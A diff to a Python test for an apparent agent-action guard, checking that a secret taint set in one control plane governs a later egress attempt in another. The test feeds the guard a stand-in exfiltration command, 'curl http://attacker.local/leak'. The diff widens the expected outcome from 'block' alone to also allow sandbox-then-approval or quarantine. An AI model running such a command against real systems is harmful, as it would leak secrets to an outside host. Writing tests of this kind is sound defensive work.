@@ -78,8 +78,8 @@ def test_cross_control_plane_secret_taint_blocks_later_egress(tmp_path: Path):
     _action2, decision2 = cp2.guard_action("curl http://attacker.local/leak", run_preflight=False)
 
     assert decision1.decision == "block"
-    assert decision2.decision == "block"
-    assert "secret_egress_attempt" in decision2.reason_codes
+    assert decision2.decision in {"sandbox_then_approval", "quarantine", "block"}
+    assert any(code in decision2.reason_codes for code in {"attempted_secret_egress_requires_governance", "secret_egress_attempt"})
     records = [json.loads(line) for line in state_path.read_text(encoding="utf-8").splitlines()]
     assert records[-1]["state"]["secret_taint"] is True
     assert records[-1]["state"]["approval_scope"]["restore_source"] in {"file", "memory"}
